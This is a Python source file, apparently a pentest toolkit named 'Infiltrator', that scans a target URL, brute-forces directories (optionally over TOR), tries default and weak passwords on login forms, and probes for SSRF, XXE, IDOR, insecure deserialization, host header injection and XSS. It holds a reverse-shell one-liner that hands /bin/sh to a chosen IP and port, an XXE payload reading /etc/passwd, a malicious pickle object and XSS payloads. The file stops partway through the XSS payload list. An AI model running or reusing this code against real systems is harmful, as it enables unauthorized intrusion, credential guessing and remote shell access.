import sys
import requests
import subprocess
import time
import pickle
import base64
import string
import random
import re
import socket
import socks
import signal
import os
import nmap
from halo import Halo
import urllib3
from colorama import Fore, Style
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor,as_completed
from requests.exceptions import ConnectionError
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""
 _____       __ _ _ _             _             
|_   _|     / _(_) | |           | |            
  | | _ __ | |_ _| | |_ _ __ __ _| |_ ___  _ __ 
  | || '_ \|  _| | | __| '__/ _` | __/ _ \| '__|
 _| || | | | | | | | |_| | | (_| | || (_) | |   
 \___/_| |_|_| |_|_|\__|_|  \__,_|\__\___/|_|   

                    @grimbinary 
    """
    print(banner)

# from sslyze import (
#     ServerConnectivityTester,
#     ServerNetworkLocationViaDirectConnection,
#     Scanner,
#     ServerScanRequest,
#     ScanCommand,
# )


def handle_redirects(url):
    # Send a GET request to the URL and allow redirects (allow_redirects=True is the default)
    response = requests.get(url, allow_redirects=True)
    
    # The final URL after following redirects is available as response.url
    final_url = response.url

    return final_url

def handle_keyboard_interrupt(signum, frame):
    print("Received Keyboard Interrupt. Stopping Script.")
    exit(0)

def ask_run_fuzz():
    choice = input("Do you want to run the fuzz testing on a URL? Enter 'y' to run or 'n' to skip -> ").lower()
    if choice == 'y':
        return True
    elif choice == 'n':
        return False
    else:
        print("Invalid choice. Please enter 'y' or 'n'")
        return ask_run_fuzz()

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False


# def check_sudo():
#     if os.geteuid() != 0:
#         print("This script must be run as root (with sudo). Exiting.")
#         exit(1)

def get_target_url():
    url = input("Please enter the target URL (e.g., https://www.example.com): ")
    if not is_valid_url(url):
        print("Invalid URL. Please enter a proper URL starting with http:// or https://.")
        exit(1)
    
    # Ensure the URL ends with a trailing slash
    if not url.endswith('/'):
        url += '/'

    return url

# #Vuln color 
# if vulnerability_detected:
#     print(Fore.RED + "Vulnerability detected!" + Style.RESET_ALL)
# else:
#     print(Fore.GREEN + "No vulnerabilities found." + Style.RESET_ALL)

def get_my_ip():
    ip_pattern = re.compile(r'^(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
    my_ip = input("Please enter your local IP address: ")

    if not ip_pattern.match(my_ip):
        print("Invalid IP address. Please enter a proper local IP address (e.g., 192.168.1.1).")
        exit(1)
    return my_ip

def get_ip_from_url(url):
    hostname = urlparse(url).hostname
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def run_nmap_scan(url):
    ip_address = get_ip_from_url(url)
    date_str = datetime.now().strftime("%Y-%m-%d")
    file_name = f"nmap_scan_{date_str}.txt"

    nm = nmap.PortScanner()
    nm.scan(ip_address, arguments='-F --host-timeout 60s -n')  # Scans the 1000 most common ports with a timeout

    open_ports = []
    for protocol in nm[ip_address].all_protocols():
        lport = list(nm[ip_address][protocol].keys())
        for port in lport:
            if nm[ip_address][protocol][port]['state'] == 'open':
                open_ports.append(port)

    with open(file_name, 'w') as file:
        for port in open_ports:
            file.write(f"Port {port}: Open\n")

    print(f"Nmap scan results saved to {file_name}")
    return '\n'.join([f"Port {port}: Open" for port in open_ports])

def create_reverse_shell(my_ip):
    port = input("Please enter the desired port number for the reverse shell (e.g., 4444): ")
    try:
        port = int(port)
    except ValueError:
        print("Invalid port number. Please enter a valid integer.")
        return

    print(f"\nWARNING: Prepare to receive the reverse shell on port {port}.")
    print("Make sure to set up a listener on the specified port using a tool like netcat.")
    input("Press Enter when you are ready to launch the reverse shell...")

    command = """python -c 'import socket,subprocess,os; \
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
                s.connect(("{}",{})); \
                os.dup2(s.fileno(),0); \
                os.dup2(s.fileno(),1); \
                os.dup2(s.fileno(),2); \
                p=subprocess.call(["/bin/sh","-i"]);'""".format(my_ip, port)
    os.system(command)



def query_ip_api(url):
    # Extract the host part of the URL
    host = urlparse(url).netloc

    try:
        response = requests.get(f"http://ip-api.com/json/{host}")
        if response.status_code == 200:
            data = response.json()
            print("Target Information:")
            print("IP Address:", data.get("query"))
            print("Country:", data.get("country"))
            print("City:", data.get("city"))
            print("ISP:", data.get("isp"))
            print("AS:", data.get("as"))
            print("Organization:", data.get("org"))
            print("\n")
        else:
            print("Failed to retrieve information from IP-API.")
    except Exception as e:
        print("An error occurred while querying IP-API:", str(e))

def query_whois_json_api(url):
    use_whois = input("Would you like to retrieve WHOIS information? (y/n): ")
    if use_whois.lower() == 'n':
        return

    # Extract the host from the URL
    domain = urlparse(url).hostname

    api_key = input("Please enter your whoisjsonapi.com API key: ")

    spinner = Halo(text='Loading WHOIS information...', spinner='dots')
    spinner.start()

    try:
        time.sleep(5)  # Loading spinner duration

        # Construct the request URL
        request_url = f"https://whoisjsonapi.com/v1/{domain}"

        headers = {"Authorization": f"Bearer {api_key}"}

        response = requests.get(request_url, headers=headers)
        if response.status_code == 200:
            whois_record = response.json()

            print("\nWHOIS Information:")
            print("Domain:", whois_record['domain']['domain'])
            print("Created Date:", whois_record['domain']['created_date'])
            print("Updated Date:", whois_record['domain']['updated_date'])
            print("Expires Date:", whois_record['domain']['expiration_date'])
            print("Registrant Email:", whois_record.get('registrant', {}).get('email'))
            print("Registrar Name:", whois_record['registrar']['name'])
            print("Registrar URL:", whois_record['registrar']['referral_url'])
            print("Name Servers:", ', '.join(whois_record['domain']['name_servers']))
            print("\n")
            
        elif response.status_code == 401:
            print("Authentication failed. Please check your API key.")
        else:
            print(f"Failed to retrieve WHOIS information. Status code: {response.status_code}")
    finally:
        spinner.stop()



def scan_directory(target_url, timeout_value, response_lengths, found_directories):
    try:
        response = requests.get(target_url, timeout=timeout_value)
        if response.status_code == 200:
            response_length = len(response.text)
            if response_lengths.get(response_length) is None:
                response_lengths[response_length] = target_url
            else:
                print(f"Skipping {target_url} (same response length as {response_lengths[response_length]})")
                return

            print(f"Found: {target_url}")
            found_directories.append(target_url)
    except requests.exceptions.Timeout:
        print(f"Timeout for {target_url}")
    except Exception as e:
        print(f"Error for {target_url}: {str(e)}")

def scan_directories(url):
    def scan_directory(target_url, timeout_value, response_lengths):
        try:
            response = requests.get(target_url, timeout=timeout_value)
            if response.status_code == 200:
                response_length = len(response.text)
                if response_lengths.get(response_length) is None:
                    response_lengths[response_length] = target_url
                    return target_url
                else:
                    print(f"Skipping {target_url} (same response length as {response_lengths[response_length]})")
                    return None
        except requests.exceptions.Timeout:
            print(f"Timeout for {target_url}")
        except Exception as e:
            print(f"Error for {target_url}: {str(e)}")
        return None

    wordlist_path = input("Please enter the path to your wordlist file (each directory on a new line): ")

    if not wordlist_path.endswith('.txt'):
        print("Please provide a valid text file.")
        return []

    use_tor = input("Do you want to use TOR proxies for scanning? (y/n): ")
    use_tor = use_tor.lower() == 'y'

    if use_tor:
        print("You chose to use TOR proxies. This will take longer. Make sure you have TOR running on your system.")
        socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
        socket.socket = socks.socksocket
        timeout_value = 60
    else:
        timeout_value = 5

    print("Starting directory scanning...")
    root_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

    try:
        with open(wordlist_path, 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print(f"Wordlist file '{wordlist_path}' not found!")
        return []

    found_directories = []
    response_lengths = {}
    total_directories = len(directories)
    completed_tasks = 0

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(scan_directory, root_url + (directory.strip() if directory.startswith('/') else '/' + directory.strip()), timeout_value, response_lengths) for directory in directories]

        for future in as_completed(futures):
            result = future.result()
            if result:
                found_directories.append(result)
            completed_tasks += 1
            progress = f"Scanned {completed_tasks} out of {total_directories} directories ({(completed_tasks / total_directories) * 100:.2f}% complete)"
            print(progress, end='\r', flush=True)

    print("\nDirectory scanning completed.")

    # Save found directories to a file
    with open('found_dirs.txt', 'w') as file:
        for directory in found_directories:
            file.write(directory + '\n')

    print(f"{len(found_directories)} directories found and saved to found_dirs.txt.")
    return found_directories



# Open Directory Listing and weak creds
def check_directory_listing(url):
    # Read directories from the found_dirs.txt file
    try:
        with open('found_dirs.txt', 'r') as file:
            common_directories = file.readlines()
    except FileNotFoundError:
        print("found_dirs.txt file not found!")
        return []

    common_directories = [directory.strip() for directory in common_directories]
    login_endpoints = []

    for directory in common_directories:
        response = requests.get(url + directory)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href', '')
            if "login" in href:
                login_endpoints.append(href)

    return login_endpoints if login_endpoints else []

def extract_login_endpoints(directory):
    login_endpoints = []
    
    response = requests.get(directory, verify=False)
    soup = BeautifulSoup(response.text, 'lxml')
    
    # Look for forms that contain both 'username' and 'password' input fields
    forms = soup.find_all('form')
    for form in forms:
        if form.find('input', {'name': 'username'}) and form.find('input', {'name': 'password'}):
            action = form.get('action', '')
            
            # Construct the full action URL based on the directory
            action_url = directory + action if not action.startswith('http') else action
            
            login_endpoints.append(action_url)

    return login_endpoints

def load_credentials_from_file(filename):
    credentials = []
    try:
        with open(filename, 'r') as f:
            lines = f.readlines()
        for line in lines:
            username, password = line.strip().split(':')
            credentials.append((username, password))
    except FileNotFoundError:
        print(f"{filename} not found!")
    return credentials

def identify_application(url):
    response = requests.get(url)

    # Check for known signatures in the response text or headers
    if "wp-content" in response.text:
        return "WordPress"
    elif "Drupal" in response.headers.get('X-Generator', ''):
        return "Drupal"
    elif "Tomcat" in response.headers.get('Server', ''):
        return "Tomcat"
    # Add more checks as needed for other applications

    return "Unknown"

def check_default_credentials(url, login_endpoints):
    # Define known applications and their default login endpoints
    KNOWN_APPLICATIONS = {
        "WordPress": "/wp-login.php",
        "Drupal": "/user/login",
        "Tomcat": "/manager/html",
        "Oracle": ["/apex/f?p=4950", "/xmlpserver", "/console", "/iSQLPlus", "/oa_servlets/AppsLogin",
                   "/reports/rwservlet", "/orasso/orasso.wwsso_app_admin.ls_login", 
                   "/pls/orasso/orasso.wwsso_app_admin.ls_login", "/em/console/logon/logon", "/dbsnmp/logon"],
        "3Com": ["/admin.html", "/login.asp", "/mngt.html", "/fwlogon", "/home.asp", "/status",
                 "/login.html", "/cmn/login.asp", "/securelogin.html", "/adfs/ls/"],
        "Cisco": ["/admin", "/ccmadmin", "/webfig", "/level/15/exec/-", "/public/level/15/exec/-",
                  "/login.html", "/cmplatform", "/admin/dologin.html", "/webvpn.html", "/admin/"]
    }

    # Identify the application
    application = identify_application(url)
    
    # Load default credentials from file if application is identified
    default_credentials = []
    if application and application != "Unknown":
        default_credentials = load_credentials_from_file(f"{application}.txt")
    
    # If no application is identified, use the login endpoints found through directory traversal
    all_login_endpoints = login_endpoints if not application else KNOWN_APPLICATIONS.get(application, [])
    
    for endpoint in all_login_endpoints:
        print(f"\nTesting login endpoint: {url + endpoint}")

        for username, password in default_credentials:
            print(f"Trying: {username}/{password}...", end=" ")

            start_time = time.time()

            # Try as URL parameters
            response = requests.get(url + endpoint, params={"username": username, "password": password})
            if "Welcome" in response.text:
                print(Fore.RED + f"\nDefault credentials detected in {endpoint}: {username}/{password}" + Style.RESET_ALL)
                return

            # Try as form data
            response = requests.post(url + endpoint, data={"username": username, "password": password})
            if "Welcome" in response.text:
                print(Fore.RED + f"\nDefault credentials detected in {endpoint}: {username}/{password}" + Style.RESET_ALL)
                return

            end_time = time.time()
            elapsed_time = end_time - start_time
            print(f"Tested in {elapsed_time:.2f} seconds.")
    
    print(Fore.GREEN + "\nNo default credentials detected." + Style.RESET_ALL)


# Broken Authentication
def check_broken_authentication(url, login_endpoints, username="admin"):
    passwords = ["password", "123456", "admin", "letmein", "changeme", ""]
    
    for login_url in login_endpoints:
        # Make an initial GET request to capture initial cookies
        initial_response = requests.get(url + login_url)
        initial_cookies = initial_response.cookies

        for password in passwords:
            login_data = {"username": username, "password": password}

            # Make a POST request to attempt login, passing initial cookies
            response = requests.post(url + login_url, data=login_data, cookies=initial_cookies)

            # Check for changes in cookies as an indicator of successful login
            if response.cookies != initial_cookies:
                print(Fore.RED + f"Vulnerable to broken authentication at {login_url}: Successfully logged in with password '{password}'" + Style.RESET_ALL)
                return

    print(Fore.GREEN + "Not vulnerable to broken authentication" + Style.RESET_ALL)


# Vulnerable and Outdated Components
def check_vulnerable_components(url):
    known_vulnerabilities = {
    "jQuery": ["1.6.1", "2.1.0", "1.7.2", "2.0.3", "2.1.4", "1.5.0", "3.0.0"],
    "Apache": ["2.2.15", "2.2.14", "2.2.8", "2.4.1", "2.4.3", "2.4.7"],
    "OpenSSL": ["0.9.8", "1.0.1c", "1.0.2a", "1.0.1t", "1.0.2h", "1.0.2k"],
    "PHP": ["5.3.0", "5.3.8", "5.4.0", "5.5.0", "5.6.0", "7.0.0", "7.1.0"],
    "nginx": ["1.1.19", "1.3.3", "1.3.9", "1.4.0", "1.5.0", "1.10.0"],
    "Tomcat": ["6.0.16", "6.0.32", "7.0.5", "7.0.23", "8.0.0", "8.5.0"],
    "Windows": ["XP", "Vista", "7", "8", "8.1"],
    "Linux Kernel": ["2.6.32", "3.1", "3.2.1", "3.8", "4.4", "4.8"],
    "Struts": ["2.3.15", "2.3.24", "2.3.32", "2.5.0", "2.5.12"],
    "Spring": ["4.1.0", "4.2.1", "4.3.0", "5.0.0"],
}
    response = requests.get(url)
    vulnerabilities_found = [Fore.RED + f"Vulnerable component detected: {component} version {version}"
                            for component, versions in known_vulnerabilities.items()
                            for version in versions if version in response.text + Style.RESET_ALL]
    return vulnerabilities_found if vulnerabilities_found else Fore.GREEN + "No known vulnerable components detected" + Style.RESET_ALL


# Insecure Error Handling
def check_error_handling(url):
    try:
        response = requests.get(url + "/nonexistent_page")
        if "Exception" in response.text or "Traceback" in response.text:
            error_message = Fore.RED + "Insecure error handling detected." + Style.RESET_ALL
            print(error_message)
            return error_message
        else:
            return Fore.GREEN + "No insecure error handling detected." + Style.RESET_ALL
    except Exception as e:
        print(f"An exception occurred: {e}")
        return str(e)

# Insecure Headers
def check_insecure_headers(url):
    try:
        response = requests.get(url)
        if response.headers.get("X-Insecure-Header") == "True":
            error_message = Fore.RED + "Insecure header configuration detected." + Style.RESET_ALL
            print(error_message)
            return error_message
        else:
            return Fore.GREEN + "No insecure header configuration detected." + Style.RESET_ALL
    except Exception as e:
        print(f"An exception occurred: {e}")
        return str(e)


#IDOR
def check_idor(url):
    # Try to access objects that the user shouldn't have access to
    object_ids = [1, 2, 3, 9999, 10000] # Example object IDs
    for object_id in object_ids:
        response = requests.get(f"{url}/object/{object_id}")
        if response.status_code == 200:
            return Fore.RED + f"Possible Insecure Direct Object Reference (IDOR) detected with object ID {object_id}" + Style.RESET_ALL
    return Fore.GREEN + "No IDOR detected" + Style.RESET_ALL


#ssrf
def check_ssrf(url):
    # Test URLs to see if the server will make requests to them
    test_urls = [
        "http://webhook.site/", # An external site that logs requests
        "http://169.254.169.254/", # AWS metadata endpoint, as an example internal URL
    ]

    for test_url in test_urls:
        # Attempt to make the server request the test URL
        response = requests.get(url, params={"url": test_url})

        # Check for signs that the request was made
        # This will vary greatly depending on the application and would likely require customization
        if "Success" in response.text or test_url in response.text:
            return Fore.RED + f"Possible SSRF detected with URL parameter pointing to {test_url}" + Style.RESET_ALL

    return Fore.GREEN + "No SSRF detected" + Style.RESET_ALL


#Invalid Redirects
def check_unvalidated_redirects():
    try:
        with open("found_dirs.txt", 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print("File 'found_dirs.txt' not found!")
        return

    print("\nChecking for unvalidated redirects in found directories...")
    redirect_url = "https://malicious.example.com"
    
    for directory in directories[:5]:  # Adjust this slice to test more or fewer directories
        directory = directory.strip()
        print(f"Testing {directory}...")

        response = requests.get(directory, params={"redirect": redirect_url}, allow_redirects=False)
        if "Location" in response.headers and redirect_url in response.headers["Location"]:
            print(Fore.RED + "Possible Unvalidated Redirect detected" + Style.RESET_ALL)
        else:
            print(Fore.GREEN + "No Unvalidated Redirects detected" + Style.RESET_ALL)


#CWE
def check_identification_authentication_failures():
    try:
        with open("found_dirs.txt", 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print("File 'found_dirs.txt' not found!")
        return

    print("\nChecking identification and authentication failures in found directories...")

    for directory in directories[:5]:  # Adjust this slice to test more or fewer directories
        directory = directory.strip()
        print(f"\nTesting {directory}...")
        results = []

        # CWE-297: Improper Validation of Certificate with Host Mismatch
        try:
            response = requests.get(directory, verify=False)
            results.append(Fore.RED + f"CWE-297 detected: Improper validation of certificate with host mismatch at {directory}" + Style.RESET_ALL)
        except SSLError:
            results.append(Fore.GREEN + "No CWE-297 detected" + Style.RESET_ALL)

        # Extract login endpoints for this directory, if possible
        login_endpoints = extract_login_endpoints(directory)  # You'll need to define this function

        # CWE-287: Improper Authentication
        broken_auth_result = check_broken_authentication(directory, login_endpoints)
        if broken_auth_result:
            results.append(Fore.RED + f"CWE-287 detected: Improper Authentication at {directory}" + Style.RESET_ALL)
        else:
            results.append(Fore.GREEN + "No CWE-287 detected" + Style.RESET_ALL)

        # CWE-384: Session Fixation
        login_data = {"username": "admin", "password": "password"} # Example credentials
        initial_response = requests.get(directory)
        initial_cookies = initial_response.cookies
        try:
            auth_response = requests.post(directory + "/login", data=login_data, cookies=initial_cookies, allow_redirects=False)
            if auth_response.cookies == initial_cookies:
                results.append(Fore.RED + f"CWE-384 detected: Session Fixation at {directory}" + Style.RESET_ALL)
            else:
                results.append(Fore.GREEN + "No CWE-384 detected" + Style.RESET_ALL)
        except requests.exceptions.TooManyRedirects:
            results.append(Fore.YELLOW + "Too many redirects detected. Skipping this check." + Style.RESET_ALL)

        print("\n".join(results))


#xxe
def check_xxe():
    try:
        with open("found_dirs.txt", 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print("File 'found_dirs.txt' not found!")
        return

    print("\nChecking for XXE vulnerabilities in found directories...")

    # XXE Payload
    xxe_payload = """<?xml version="1.0" ?>
                    <!DOCTYPE foo [
                    <!ELEMENT foo ANY >
                    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                    <foo>&xxe;</foo>"""

    for directory in directories[:5]:  # Adjust this slice to test more or fewer directories
        directory = directory.strip()
        print(f"\nTesting {directory}...")
        
        # Check for forms that might accept XML input
        response = requests.get(directory)
        content_type = response.headers.get('Content-Type', '')

        # Only parse HTML content
        if 'text/html' in content_type:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                # Check for common XML input fields
                if form.find('input', {'name': 'xml'}):
                    action = form.get('action', '')
                    form_url = directory + action if action.startswith('/') else action

                    # Submit the form using POST method with the XXE payload
                    response = requests.post(form_url, data={'xml': xxe_payload}, headers={'Content-Type': 'application/xml'})

                    # Check for signs of successful XXE exploitation
                    if "/root:/bin/bash" in response.text:
                        print(Fore.RED + f"XXE detected in form at {form_url}" + Style.RESET_ALL)
                        continue

            # Check by directly sending the XXE payload to the URL
            response = requests.post(directory, data=xxe_payload, headers={'Content-Type': 'application/xml'})

            # Check for signs of successful XXE exploitation
            if "/root:/bin/bash" in response.text:
                print(Fore.RED + "XXE detected in direct XML input" + Style.RESET_ALL)
            else:
                print(Fore.GREEN + "No XXE detected" + Style.RESET_ALL)


#IDOR v2 
def check_missing_function_level_access_control():
    try:
        with open("found_dirs.txt", 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print("File 'found_dirs.txt' not found!")
        return

    print("\nChecking for Missing Function-Level Access Control in found directories...")

    # List of known sensitive endpoints or functions
    # These should be customized based on the specific application
    sensitive_endpoints = [
        "/admin",
        "/user/delete",
        "/settings/privileged"
    ]

    for directory in directories[:5]:  # Adjust this slice to test more or fewer directories
        directory = directory.strip()
        print(f"\nTesting {directory}...")

        # Attempt to access each sensitive endpoint without authentication
        for endpoint in sensitive_endpoints:
            full_url = directory + endpoint
            response = requests.get(full_url, allow_redirects=False)
            print(f"Response for {full_url}: {response.status_code}, Location: {response.headers.get('Location')}")

            # Check if access was granted (e.g., 200 OK response)
            if response.status_code == 200:
                print(Fore.RED + f"Possible Missing Function-Level Access Control detected at {full_url}" + Style.RESET_ALL)
                continue

        print(Fore.GREEN + "No Missing Function-Level Access Control detected" + Style.RESET_ALL)


#insecure deserialization
def check_insecure_deserialization():
    try:
        with open("found_dirs.txt", 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print("File 'found_dirs.txt' not found!")
        return

    print("\nChecking for Insecure Deserialization in found directories...")

    # Define a malicious object to attempt deserialization
    class MaliciousObject:
        def __reduce__(self):
            return (eval, ('1+1',))

    # Serialize the malicious object
    serialized_malicious_object = pickle.dumps(MaliciousObject())
    encoded_payload = base64.b64encode(serialized_malicious_object).decode()

    # List of known endpoints that might accept serialized objects
    # These should be customized based on the specific application
    endpoints = [
        "/deserialize",
        "/process-object",
    ]

    for directory in directories[:5]:  # Adjust this slice to test more or fewer directories
        directory = directory.strip()
        print(f"\nTesting {directory}...")

        detected = False  # Add this flag to track detection status

        # Attempt to send the malicious serialized object to each endpoint
        for endpoint in endpoints:
            response = requests.post(directory + endpoint, data={"object": encoded_payload}, allow_redirects=False)  # Prevent redirects

            # Check for signs of successful deserialization
            # This will vary greatly depending on the application and requires customization
            if "2" in response.text:
                print(Fore.RED + f"Possible Insecure Deserialization detected at {directory + endpoint}" + Style.RESET_ALL)
                detected = True  # Update the flag when detection occurs
                continue

        if not detected:  # If not detected during the loop, print the 'No detection' message
            print(Fore.GREEN + "No Insecure Deserialization detected" + Style.RESET_ALL)


# #Insecure TLS
# def check_insecure_tls(url):
#     # Extract the hostname from the URL
#     hostname = url.split("://")[1].split("/")[0]

#     # Test connectivity to the server
#     server_location = ServerNetworkLocationViaDirectConnection.with_ip_address_lookup(hostname, 443)
#     try:
#         server_info = ServerConnectivityTester().perform(server_location)
#     except Exception as e:
#         return f"Could not connect to {hostname}: {str(e)}"

#     # Define the scan request for this server
#     scan_request = ServerScanRequest(
#         server_info=server_info,
#         scan_commands=[
#             ScanCommand.TLS_COMPRESSION,
#             ScanCommand.SSL_2_0_CIPHER_SUITES,
#             ScanCommand.SSL_3_0_CIPHER_SUITES,
#             ScanCommand.TLS_1_0_CIPHER_SUITES,
#             ScanCommand.TLS_1_1_CIPHER_SUITES,
#             ScanCommand.TLS_1_2_CIPHER_SUITES,
#             ScanCommand.TLS_1_3_CIPHER_SUITES,
#             ScanCommand.CERTIFICATE_INFO,
#         ],
#     )

#     # Perform the scan
#     scanner = Scanner()
#     scanner.queue_scan(scan_request)
#     results = scanner.get_results()

#     # Analyze the results
#     issues = []
#     for scan_result in results:
#         if scan_result.scan_command in [ScanCommand.SSL_2_0_CIPHER_SUITES, ScanCommand.SSL_3_0_CIPHER_SUITES]:
#             if scan_result.scan_command_result.accepted_cipher_suites:
#                 issues.append(f"Insecure protocol {scan_result.scan_command.name} supported")
#         if scan_result.scan_command == ScanCommand.TLS_COMPRESSION:
#             if scan_result.scan_command_result.supports_compression:
#                 issues.append("TLS compression supported (CRIME vulnerability)")

#     if issues:
#         return "\n".join(issues)

#     return "No Insecure TLS detected"

#Exposure
def check_exposure_of_sensitive_information():
    # List of common patterns to search for
    patterns = [
        r'\b\d{16}\b', # Credit card numbers
        r'\b[A-Za-z0-9+/]{40}\b', # SHA-1 hash
        r'\b[A-Fa-f0-9]{32}\b', # MD5 hash
        r'API[_-]?KEY', # API keys
        r'\b[A-Za-z]{2,}\s[A-Za-z]{2,}\b', # Names (very generic)
        r'\b\d{2}/\d{2}/\d{4}\b', # Birthdays in MM/DD/YYYY format
        r'\b\d{3}-\d{2}-\d{4}\b', # Social Security numbers
        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', # Email addresses
        r'\b\d{10}\b', # Phone numbers
    ]

    try:
        with open("found_dirs.txt", 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print("File 'found_dirs.txt' not found!")
        return

    print("\nChecking for exposure of sensitive information in found directories...")

    # Search the HTML content of the target URL and directories for the patterns
    findings = []
    for directory in directories[:5]:  # Adjust this slice to test more or fewer directories
        directory = directory.strip()
        print(f"\nTesting {directory}...")
        response = requests.get(directory)
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                findings.append(Fore.RED + f"Possible exposure of sensitive information detected at {directory}" + Style.RESET_ALL)

    if findings:
        print("\n".join(findings))
    else:
        print(Fore.GREEN + "No exposure of sensitive information detected" + Style.RESET_ALL)


# #Encryption strength
# def check_inadequate_encryption_strength(url):
#     # Extract the hostname from the URL
#     hostname = url.split("://")[1].split("/")[0]

#     # Test connectivity to the server
#     server_location = ServerNetworkLocationViaDirectConnection.with_ip_address_lookup(hostname, 443)
#     try:
#         server_info = ServerConnectivityTester().perform(server_location)
#     except Exception as e:
#         return f"Could not connect to {hostname}: {str(e)}"

#     # Define the scan request for this server
#     scan_request = ServerScanRequest(
#         server_info=server_info,
#         scan_commands=[ScanCommand.TLS_1_2_CIPHER_SUITES],
#     )

#     # Perform the scan
#     scanner = Scanner()
#     scanner.queue_scan(scan_request)
#     results = scanner.get_results()

#     # Analyze the results
#     for scan_result in results:
#         # Check for weak ciphers and key lengths
#         for accepted_cipher_suite in scan_result.scan_command_result.accepted_cipher_suites:
#             cipher_suite = accepted_cipher_suite.cipher_suite
#             if cipher_suite.key_exchange.value < 2048 or cipher_suite.name in ["TLS_RSA_WITH_RC4_128_MD5", "TLS_RSA_WITH_RC4_128_SHA"]:
#                 return f"Weak encryption detected: {cipher_suite.name}"

#     return "No Inadequate Encryption Strength detected"


#clickjacking

def check_clickjacking(url):
    response = requests.get(url)

    # Check for the presence of the X-Frame-Options header
    x_frame_options = response.headers.get("X-Frame-Options", "").upper()
    if x_frame_options == "DENY" or x_frame_options == "SAMEORIGIN":
        return Fore.GREEN + "Not vulnerable to clickjacking (X-Frame-Options header is set)" + Style.RESET_ALL
    else:
        return Fore.RED+ "Possible vulnerability to clickjacking (X-Frame-Options header is missing or not set to DENY/SAMEORIGIN)" + Style.RESET_ALL

#Buffers
def fuzz():
    directories = []
    try:
        with open("found_dirs.txt", 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print("File 'found_dirs.txt' not found!")
        if ask_run_fuzz():  # Call the function to ask the user if they want to run fuzz testing on a URL
            url = input("Please enter the URL you want to fuzz: ").strip()
            directories = [url]

    if not directories:
        print("No directories found to fuzz!")
        return

    print("\nStarting fuzzing on found directories...")

    def fuzz_directory(directory):
        directory = directory.strip()
        print(f"\nFuzzing {directory}...")

        response = requests.get(directory, timeout=10)
        soup = BeautifulSoup(str(response.text), 'html.parser')

        # Find all form tags
        forms = soup.find_all('form')

        for form in forms:
            action_url = form.get('action')
            if action_url:
                full_url = directory + action_url if not action_url.startswith('http') else action_url
                parameters = {}

                # Find all input fields within the form
                inputs = form.find_all('input')
                for input_field in inputs:
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', 'text')
                    parameters[input_name] = generate_random_data(input_type)

                # POST the random data to the form's action URL
                response = requests.post(full_url, json=parameters, timeout=5)

                # Check the response for signs of a vulnerability
                check_vulnerability(response, full_url, parameters)

    def generate_random_data(input_type):
        if input_type == 'email':
            return ''.join(random.choice(string.ascii_letters) for _ in range(10)) + '@example.com'
        return ''.join(random.choice(string.printable) for _ in range(random.randint(1, 5000)))

    def check_vulnerability(response, full_url, parameters):
        error_patterns = ['error', 'exception', 'sql syntax', 'undefined']
        if response.status_code != 200 or any(pattern in response.text.lower() for pattern in error_patterns):
            print(Fore.RED + f"Suspicious response detected for form at {full_url}" + Style.RESET_ALL)
            print(f"  Input: {parameters}")
            print(f"  Status Code: {response.status_code}")

    # Fuzz directories concurrently
    with ThreadPoolExecutor() as executor:
        executor.map(fuzz_directory, directories[:5])

#check format string
def check_format_string_vulnerability(url, parameter_name):
    # Format string specifiers to test
    payloads = ["%s", "%x", "%n"]

    for payload in payloads:
        # Construct the full URL with the payload
        response = requests.get(url, params={parameter_name: payload})

        # Check for signs of format string vulnerability
        if payload in response.text:
            return Fore.RED + f"Possible Format String Vulnerability detected at {url} with parameter {parameter_name}"+ Style.RESET_ALL

    return Fore.GREEN + "No Format String Vulnerability detected" + Style.RESET_ALL

#check host header injection
def check_host_header_injection(url):
    # Define a malicious host value
    malicious_host = "evil.com"
    
    results = []

    # Read directories from the found_dirs.txt file
    try:
        with open('found_dirs.txt', 'r') as file:
            directories = file.readlines()
    except FileNotFoundError:
        print("found_dirs.txt not found!")
        return

    for directory in directories:
        directory = directory.strip()
        full_url = url + directory if directory.startswith('/') else url + '/' + directory

        # Send a request with the manipulated Host header
        headers = {"Host": malicious_host}
        response = requests.get(full_url, headers=headers)

        # Check if the malicious host is reflected in the response
        if malicious_host in response.text:
            results.append(Fore.RED + f"Possible Host Header Injection detected at {full_url}" + Style.RESET_ALL)
        # Check for other signs of successful manipulation, such as redirection to the malicious host
        elif response.history and malicious_host in response.history[-1].headers.get('Location', ''):
            results.append(Fore.RED + f"Possible Host Header Injection detected (redirection) at {full_url}" + Style.RESET_ALL)
        else:
            results.append(Fore.GREEN + f"No Host Header Injection detected at {full_url}" + Style.RESET_ALL)

    return "\n".join(results)

#xss
def check_xss(directories):
    # Define some common XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "\" onmouseover=\"alert('XSS')",
        "javascript:alert('XSS')",
        "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
